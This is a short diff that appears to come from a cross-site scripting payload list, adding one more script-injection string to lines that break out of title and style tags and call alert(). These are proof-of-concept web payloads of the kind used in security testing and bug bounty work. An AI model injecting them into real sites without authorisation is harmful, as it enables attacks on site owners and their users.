@@ -26,3 +26,4 @@
 </title><body onload=alert("XSS")>
 </title><script>alert(1)</script>
 "></title></style></scRipt><scRipt>alert('OPENBUGBOUNTY')</scRipt>
+"><script>alert('OPENBUGBOUNTY')</script>
